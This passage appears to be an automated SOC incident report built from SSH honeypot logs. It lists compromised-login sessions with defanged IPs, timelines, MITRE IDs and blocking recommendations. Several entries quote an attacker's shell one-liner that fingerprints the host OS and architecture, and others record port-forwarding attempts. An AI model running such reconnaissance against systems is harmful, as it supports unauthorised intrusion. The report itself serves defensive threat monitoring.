| `2026-07-08 19:46:00` | `cowrie.command.input` |
| `2026-07-08 19:46:00` | `cowrie.command.input` |
| `2026-07-08 19:46:00` | `cowrie.command.input` |
| `2026-07-08 19:46:00` | `cowrie.log.closed` |
| `2026-07-08 19:46:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-598b1a147383

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 19:46 |
| **Last Seen** | 2026-07-08 19:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:46:38` | `cowrie.session.connect` |
| `2026-07-08 19:46:39` | `cowrie.client.version` |
| `2026-07-08 19:46:39` | `cowrie.client.kex` |
| `2026-07-08 19:46:41` | `cowrie.login.success` |
| `2026-07-08 19:46:43` | `cowrie.session.params` |
| `2026-07-08 19:46:43` | `cowrie.command.input` |
| `2026-07-08 19:46:43` | `cowrie.command.input` |
| `2026-07-08 19:46:43` | `cowrie.command.input` |
| `2026-07-08 19:46:43` | `cowrie.command.input` |
| `2026-07-08 19:46:43` | `cowrie.command.input` |
| `2026-07-08 19:46:43` | `cowrie.command.success` |
| `2026-07-08 19:46:43` | `cowrie.command.input` |
| `2026-07-08 19:46:43` | `cowrie.command.input` |
| `2026-07-08 19:46:43` | `cowrie.command.input` |
| `2026-07-08 19:46:43` | `cowrie.command.input` |
| `2026-07-08 19:46:43` | `cowrie.log.closed` |
| `2026-07-08 19:46:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-998bf7233621

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 19:48 |
| **Last Seen** | 2026-07-08 19:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:48:00` | `cowrie.session.connect` |
| `2026-07-08 19:48:00` | `cowrie.client.version` |
| `2026-07-08 19:48:01` | `cowrie.client.kex` |
| `2026-07-08 19:48:02` | `cowrie.login.success` |
| `2026-07-08 19:48:03` | `cowrie.session.params` |
| `2026-07-08 19:48:03` | `cowrie.command.input` |
| `2026-07-08 19:48:03` | `cowrie.command.input` |
| `2026-07-08 19:48:03` | `cowrie.command.input` |
| `2026-07-08 19:48:03` | `cowrie.command.input` |
| `2026-07-08 19:48:03` | `cowrie.command.input` |
| `2026-07-08 19:48:03` | `cowrie.command.success` |
| `2026-07-08 19:48:03` | `cowrie.command.input` |
| `2026-07-08 19:48:03` | `cowrie.command.input` |
| `2026-07-08 19:48:03` | `cowrie.command.input` |
| `2026-07-08 19:48:03` | `cowrie.command.input` |
| `2026-07-08 19:48:04` | `cowrie.log.closed` |
| `2026-07-08 19:48:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9885202fb95

| Field | Detail |
|---|---|
| **Source IP** | `118.183.180[.]108` |
| **First Seen** | 2026-07-08 19:48 |
| **Last Seen** | 2026-07-08 19:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:48:40` | `cowrie.session.connect` |
| `2026-07-08 19:48:40` | `cowrie.client.version` |
| `2026-07-08 19:48:40` | `cowrie.client.kex` |
| `2026-07-08 19:48:42` | `cowrie.login.success` |
| `2026-07-08 19:48:42` | `cowrie.direct-tcpip.request` |
| `2026-07-08 19:48:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.183.180[.]108` to AbuseIPDB if not already reported
- [ ] Block `118.183.180[.]108` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57339c8c26d6

| Field | Detail |
|---|---|
| **Source IP** | `180.151.254[.]218` |
| **First Seen** | 2026-07-08 19:48 |
| **Last Seen** | 2026-07-08 19:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:48:52` | `cowrie.session.connect` |
| `2026-07-08 19:48:53` | `cowrie.client.version` |
| `2026-07-08 19:48:53` | `cowrie.client.kex` |
| `2026-07-08 19:48:54` | `cowrie.login.success` |
| `2026-07-08 19:48:55` | `cowrie.direct-tcpip.request` |
| `2026-07-08 19:48:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.151.254[.]218` to AbuseIPDB if not already reported
- [ ] Block `180.151.254[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ae8bf286759

| Field | Detail |
|---|---|
| **Source IP** | `222.117.173[.]94` |
| **First Seen** | 2026-07-08 19:48 |
| **Last Seen** | 2026-07-08 19:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:48:53` | `cowrie.session.connect` |
| `2026-07-08 19:48:54` | `cowrie.client.version` |
| `2026-07-08 19:48:54` | `cowrie.client.kex` |
| `2026-07-08 19:48:56` | `cowrie.login.success` |
| `2026-07-08 19:48:56` | `cowrie.direct-tcpip.request` |
| `2026-07-08 19:49:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.117.173[.]94` to AbuseIPDB if not already reported
- [ ] Block `222.117.173[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-129320e1c1c7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 19:48 |
| **Last Seen** | 2026-07-08 19:49 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:48:59` | `cowrie.session.connect` |
| `2026-07-08 19:48:59` | `cowrie.client.version` |
| `2026-07-08 19:48:59` | `cowrie.client.kex` |
| `2026-07-08 19:49:01` | `cowrie.login.success` |
| `2026-07-08 19:49:03` | `cowrie.session.params` |
| `2026-07-08 19:49:03` | `cowrie.command.input` |
| `2026-07-08 19:49:03` | `cowrie.command.input` |
| `2026-07-08 19:49:03` | `cowrie.command.input` |
| `2026-07-08 19:49:03` | `cowrie.command.input` |
| `2026-07-08 19:49:03` | `cowrie.command.input` |
| `2026-07-08 19:49:03` | `cowrie.command.success` |
| `2026-07-08 19:49:03` | `cowrie.command.input` |
| `2026-07-08 19:49:03` | `cowrie.command.input` |
| `2026-07-08 19:49:03` | `cowrie.command.input` |
| `2026-07-08 19:49:03` | `cowrie.command.input` |
| `2026-07-08 19:49:04` | `cowrie.log.closed` |
| `2026-07-08 19:49:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7204a4c74bb0

| Field | Detail |
|---|---|
| **Source IP** | `117.248.201[.]39` |
| **First Seen** | 2026-07-08 19:49 |
| **Last Seen** | 2026-07-08 19:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:49:02` | `cowrie.session.connect` |
| `2026-07-08 19:49:03` | `cowrie.client.version` |
| `2026-07-08 19:49:03` | `cowrie.client.kex` |
| `2026-07-08 19:49:05` | `cowrie.login.success` |
| `2026-07-08 19:49:05` | `cowrie.direct-tcpip.request` |
| `2026-07-08 19:49:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.248.201[.]39` to AbuseIPDB if not already reported
- [ ] Block `117.248.201[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9de65cee640a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 19:49 |
| **Last Seen** | 2026-07-08 19:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:49:59` | `cowrie.session.connect` |
| `2026-07-08 19:50:00` | `cowrie.client.version` |
| `2026-07-08 19:50:00` | `cowrie.client.kex` |
| `2026-07-08 19:50:02` | `cowrie.login.success` |
| `2026-07-08 19:50:03` | `cowrie.session.params` |
| `2026-07-08 19:50:03` | `cowrie.command.input` |
| `2026-07-08 19:50:03` | `cowrie.command.input` |
| `2026-07-08 19:50:03` | `cowrie.command.input` |
| `2026-07-08 19:50:03` | `cowrie.command.input` |
| `2026-07-08 19:50:03` | `cowrie.command.input` |
| `2026-07-08 19:50:03` | `cowrie.command.success` |
| `2026-07-08 19:50:03` | `cowrie.command.input` |
| `2026-07-08 19:50:03` | `cowrie.command.input` |
| `2026-07-08 19:50:03` | `cowrie.command.input` |
| `2026-07-08 19:50:03` | `cowrie.command.input` |
| `2026-07-08 19:50:04` | `cowrie.log.closed` |
| `2026-07-08 19:50:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f00417867c57

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]58` |
| **First Seen** | 2026-07-08 19:50 |
| **Last Seen** | 2026-07-08 19:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:50:09` | `cowrie.session.connect` |
| `2026-07-08 19:50:09` | `cowrie.client.version` |
| `2026-07-08 19:50:09` | `cowrie.client.kex` |
| `2026-07-08 19:50:10` | `cowrie.login.success` |
| `2026-07-08 19:50:10` | `cowrie.direct-tcpip.request` |
| `2026-07-08 19:50:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]58` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a9ccad3527a

| Field | Detail |
|---|---|
| **Source IP** | `179.184.85[.]167` |
| **First Seen** | 2026-07-08 19:50 |
| **Last Seen** | 2026-07-08 19:50 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:50:15` | `cowrie.session.connect` |
| `2026-07-08 19:50:16` | `cowrie.client.version` |
| `2026-07-08 19:50:16` | `cowrie.client.kex` |
| `2026-07-08 19:50:19` | `cowrie.login.success` |
| `2026-07-08 19:50:20` | `cowrie.direct-tcpip.request` |
| `2026-07-08 19:50:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.85[.]167` to AbuseIPDB if not already reported
- [ ] Block `179.184.85[.]167` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69ac0f1e8d5e

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-08 19:50 |
| **Last Seen** | 2026-07-08 19:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:50:48` | `cowrie.session.connect` |
| `2026-07-08 19:50:48` | `cowrie.client.version` |
| `2026-07-08 19:50:48` | `cowrie.client.kex` |
| `2026-07-08 19:50:49` | `cowrie.login.success` |
| `2026-07-08 19:50:49` | `cowrie.session.params` |
| `2026-07-08 19:50:49` | `cowrie.command.input` |
| `2026-07-08 19:50:49` | `cowrie.log.closed` |
| `2026-07-08 19:50:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfa5f2aa4f4c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 19:51 |
| **Last Seen** | 2026-07-08 19:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:51:19` | `cowrie.session.connect` |
| `2026-07-08 19:51:20` | `cowrie.client.version` |
| `2026-07-08 19:51:20` | `cowrie.client.kex` |
| `2026-07-08 19:51:22` | `cowrie.login.success` |
| `2026-07-08 19:51:23` | `cowrie.session.params` |
| `2026-07-08 19:51:23` | `cowrie.command.input` |
| `2026-07-08 19:51:23` | `cowrie.command.input` |
| `2026-07-08 19:51:23` | `cowrie.command.input` |
| `2026-07-08 19:51:23` | `cowrie.command.input` |
| `2026-07-08 19:51:23` | `cowrie.command.input` |
| `2026-07-08 19:51:23` | `cowrie.command.success` |
| `2026-07-08 19:51:23` | `cowrie.command.input` |
| `2026-07-08 19:51:23` | `cowrie.command.input` |
| `2026-07-08 19:51:23` | `cowrie.command.input` |
| `2026-07-08 19:51:23` | `cowrie.command.input` |
| `2026-07-08 19:51:24` | `cowrie.log.closed` |
| `2026-07-08 19:51:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4155b2b01cb3

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 19:51 |
| **Last Seen** | 2026-07-08 19:52 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:51:51` | `cowrie.session.connect` |
| `2026-07-08 19:51:52` | `cowrie.client.version` |
| `2026-07-08 19:51:52` | `cowrie.client.kex` |
| `2026-07-08 19:51:58` | `cowrie.login.success` |
| `2026-07-08 19:52:01` | `cowrie.session.params` |
| `2026-07-08 19:52:01` | `cowrie.command.input` |
| `2026-07-08 19:52:02` | `cowrie.log.closed` |
| `2026-07-08 19:52:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcb80a559c6f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 19:51 |
| **Last Seen** | 2026-07-08 19:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:51:59` | `cowrie.session.connect` |
| `2026-07-08 19:51:59` | `cowrie.client.version` |
| `2026-07-08 19:51:59` | `cowrie.client.kex` |
| `2026-07-08 19:52:01` | `cowrie.login.success` |
| `2026-07-08 19:52:03` | `cowrie.session.params` |
| `2026-07-08 19:52:03` | `cowrie.command.input` |
| `2026-07-08 19:52:03` | `cowrie.command.input` |
| `2026-07-08 19:52:03` | `cowrie.command.input` |
| `2026-07-08 19:52:03` | `cowrie.command.input` |
| `2026-07-08 19:52:03` | `cowrie.command.input` |
| `2026-07-08 19:52:03` | `cowrie.command.success` |
| `2026-07-08 19:52:03` | `cowrie.command.input` |
| `2026-07-08 19:52:03` | `cowrie.command.input` |
| `2026-07-08 19:52:03` | `cowrie.command.input` |
| `2026-07-08 19:52:03` | `cowrie.command.input` |
| `2026-07-08 19:52:03` | `cowrie.log.closed` |
| `2026-07-08 19:52:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e49831a1996

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-07-08 19:52 |
| **Last Seen** | 2026-07-08 19:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:52:03` | `cowrie.session.connect` |
| `2026-07-08 19:52:03` | `cowrie.client.version` |
| `2026-07-08 19:52:03` | `cowrie.client.kex` |
| `2026-07-08 19:52:05` | `cowrie.login.success` |
| `2026-07-08 19:52:05` | `cowrie.direct-tcpip.request` |
| `2026-07-08 19:52:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-726422ffb2fa

| Field | Detail |
|---|---|
| **Source IP** | `37.238.45[.]202` |
| **First Seen** | 2026-07-08 19:52 |
| **Last Seen** | 2026-07-08 19:52 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:52:14` | `cowrie.session.connect` |
| `2026-07-08 19:52:16` | `cowrie.client.version` |
| `2026-07-08 19:52:16` | `cowrie.client.kex` |
| `2026-07-08 19:52:19` | `cowrie.login.success` |
| `2026-07-08 19:52:20` | `cowrie.direct-tcpip.request` |
| `2026-07-08 19:52:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.238.45[.]202` to AbuseIPDB if not already reported
- [ ] Block `37.238.45[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4aca79ba5867

| Field | Detail |
|---|---|
| **Source IP** | `220.246.43[.]172` |
| **First Seen** | 2026-07-08 19:52 |
| **Last Seen** | 2026-07-08 19:53 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:52:49` | `cowrie.session.connect` |
| `2026-07-08 19:52:52` | `cowrie.client.version` |
| `2026-07-08 19:52:53` | `cowrie.client.kex` |
| `2026-07-08 19:52:56` | `cowrie.login.success` |
| `2026-07-08 19:52:57` | `cowrie.direct-tcpip.request` |
| `2026-07-08 19:53:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.43[.]172` to AbuseIPDB if not already reported
- [ ] Block `220.246.43[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c245973ad5a

| Field | Detail |
|---|---|
| **Source IP** | `121.202.198[.]98` |
| **First Seen** | 2026-07-08 19:53 |
| **Last Seen** | 2026-07-08 19:54 |
| **Session Duration** | 53s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:53:07` | `cowrie.session.connect` |
| `2026-07-08 19:53:09` | `cowrie.client.version` |
| `2026-07-08 19:53:10` | `cowrie.client.kex` |
| `2026-07-08 19:53:15` | `cowrie.login.success` |
| `2026-07-08 19:53:18` | `cowrie.direct-tcpip.request` |
| `2026-07-08 19:54:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.202.198[.]98` to AbuseIPDB if not already reported
- [ ] Block `121.202.198[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-932cfe8d8aeb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 19:53 |
| **Last Seen** | 2026-07-08 19:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
